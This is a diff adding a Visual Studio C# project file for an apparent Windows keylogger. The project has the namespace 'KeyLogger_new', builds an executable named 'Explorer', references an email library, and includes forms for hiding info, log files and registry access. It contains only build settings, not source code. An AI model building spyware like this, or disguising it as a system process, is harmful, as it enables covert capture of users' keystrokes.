@@ -1,0 +1,306 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>8.0.30703</ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{02989C4D-ED11-4EBA-BA66-795AEADB1F31}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>KeyLogger_new</RootNamespace>
+    <AssemblyName>Explorer</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
+    <FileAlignment>512</FileAlignment>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ProductName>Keylogger</ProductName>
+    <PublisherName>Key Stroke</PublisherName>
+    <SuiteName>Keylogger</SuiteName>
+    <ApplicationRevision>303</ApplicationRevision>
+    <ApplicationVersion>1.1.15.%2a</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <PublishWizardCompleted>true</PublishWizardCompleted>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>3xhumed-Tools-Hardware-Pack-3-Logitech-G15-1.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestCertificateThumbprint>96F5A074778B1B1462669C4AB2BA597C36B5C15D</ManifestCertificateThumbprint>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestKeyFile>KeyLogger new_TemporaryKey.pfx</ManifestKeyFile>
+  </PropertyGroup>
+  <PropertyGroup>
+    <GenerateManifests>true</GenerateManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <SignManifests>true</SignManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>KeyLogger_new.Program</StartupObject>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Email %28dll%29">
+      <HintPath>..\..\Email (dll)\Email (dll)\bin\Debug\Email (dll).dll</HintPath>
+    </Reference>
+    <Reference Include="size and location DLL MAIN NEW">
+      <HintPath>..\..\..\DLL PROJECTS\size and location DLL MAIN NEW\size and location DLL MAIN NEW\bin\Debug\size and location DLL MAIN NEW.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="display_pressed_key.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="display_pressed_key.Designer.cs">
+      <DependentUpon>display_pressed_key.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Edit commands.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Edit commands.Designer.cs">
+      <DependentUpon>Edit commands.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="guess_words.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="guess_words.Designer.cs">
+      <DependentUpon>guess_words.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Help.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Help.Designer.cs">
+      <DependentUpon>Help.cs</DependentUpon>
+    </Compile>
+    <Compile Include="hideinfo.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="hideinfo.Designer.cs">
+      <DependentUpon>hideinfo.cs</DependentUpon>
+    </Compile>
+    <Compile Include="image info.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="image info.Designer.cs">
+      <DependentUpon>image info.cs</DependentUpon>
+    </Compile>
+    <Compile Include="info.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="info.Designer.cs">
+      <DependentUpon>info.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Listofprocess.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Listofprocess.Designer.cs">
+      <DependentUpon>Listofprocess.cs</DependentUpon>
+    </Compile>
+    <Compile Include="logfiles.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="logfiles.Designer.cs">
+      <DependentUpon>logfiles.cs</DependentUpon>
+    </Compile>
+    <Compile Include="NativeWin32.cs" />
+    <Compile Include="new_process.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="new_process.Designer.cs">
+      <DependentUpon>new_process.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program info.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Program info.Designer.cs">
+      <DependentUpon>Program info.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="readwrite_registy.cs" />
+    <Compile Include="Utilities.cs" />
+    <EmbeddedResource Include="display_pressed_key.resx">
+      <DependentUpon>display_pressed_key.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Edit commands.resx">
+      <DependentUpon>Edit commands.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="guess_words.resx">
+      <DependentUpon>guess_words.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Help.resx">
+      <DependentUpon>Help.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="hideinfo.resx">
+      <DependentUpon>hideinfo.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="image info.resx">
+      <DependentUpon>image info.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="info.resx">
+      <DependentUpon>info.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Listofprocess.resx">
+      <DependentUpon>Listofprocess.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="logfiles.resx">
+      <DependentUpon>logfiles.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="new_process.resx">
+      <DependentUpon>new_process.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Program info.resx">
+      <DependentUpon>Program info.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="app.config" />
+    <None Include="KeyLogger new_TemporaryKey.pfx" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="3xhumed-Tools-Hardware-Pack-3-Logitech-G15-1.ico" />
+    <None Include="Resources\tutorial13.jpg" />
+    <None Include="Resources\tutorial12.JPG" />
+    <None Include="Resources\tutorial11.JPG" />
+    <None Include="Resources\tutorial10.JPG" />
+    <None Include="Resources\tutorial9.JPG" />
+    <None Include="Resources\tutorial8.jpg" />
+    <None Include="Resources\tutorial7.JPG" />
+    <None Include="Resources\tutorial6.JPG" />
+    <None Include="Resources\tutorial5.JPG" />
+    <None Include="Resources\tutorial4.JPG" />
+    <None Include="Resources\tutorial3.JPG" />
+    <None Include="Resources\tutorial2.JPG" />
+    <None Include="Resources\tutorial1.JPG" />
+    <None Include="Resources\tutorial20.JPG" />
+    <None Include="Resources\tutorial19.JPG" />
+    <None Include="Resources\tutorial18a.JPG" />
+    <None Include="Resources\tutorial18.jpg" />
+    <None Include="Resources\tutorial17.jpg" />
+    <None Include="Resources\tutorial16.jpg" />
+    <None Include="Resources\tutorial15b.jpg" />
+    <None Include="Resources\tutorial15a.jpg" />
+    <None Include="Resources\tutorial15.jpg" />
+    <None Include="Resources\tutorial14.JPG" />
+    <None Include="Resources\home1.jpg" />
+    <None Include="Resources\home9.jpg" />
+    <None Include="Resources\home8.jpg" />
+    <None Include="Resources\home7.jpg" />
+    <None Include="Resources\home 6.jpg" />
+    <None Include="Resources\home 5.jpg" />
+    <None Include="Resources\home 4.jpg" />
+    <None Include="Resources\home 3.jpg" />
+    <None Include="Resources\home 2.jpg" />
+    <None Include="Resources\guesswords3.jpg" />
+    <None Include="Resources\guesswords2.jpg" />
+    <None Include="Resources\guesswords.jpg" />
+    <None Include="Resources\commands3.jpg" />
+    <None Include="Resources\commands2.jpg" />
+    <None Include="Resources\commands.jpg" />
+    <None Include="Resources\system2.jpg" />
+    <None Include="Resources\system1.jpg" />
+    <None Include="Resources\system commands.jpg" />
+    <None Include="Resources\home10.jpg" />
+    <None Include="Resources\home 1.JPG" />
+    <None Include="Resources\1370026386_24258.ico" />
+    <None Include="Resources\backkk.PNG" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include=".NETFramework,Version=v4.0,Profile=Client">
+      <Visible>False</Visible>
+      <ProductName>Microsoft .NET Framework 4 Client Profile %28x86 and x64%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Windows.Installer.3.1">
+      <Visible>False</Visible>
+      <ProductName>Windows Installer 3.1</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
